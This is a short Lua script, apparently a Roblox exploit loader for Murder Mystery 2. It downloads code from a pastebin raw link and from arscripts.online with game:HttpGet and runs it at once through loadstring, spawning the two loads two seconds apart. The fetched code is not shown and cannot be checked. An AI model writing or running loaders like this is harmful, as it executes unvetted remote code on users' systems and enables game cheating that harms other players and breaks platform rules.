local function ScriptLoader() 
    loadstring(game:HttpGet("https://pastebin.com/raw/2fANg0gR"))()
end 
local function nsUILoader() 
    loadstring(game:HttpGet("https://arscripts.online/MM2/nsNotify.lua"))()
end 
task.spawn(ScriptLoader)
task.wait(2)
task.spawn(nsUILoader)

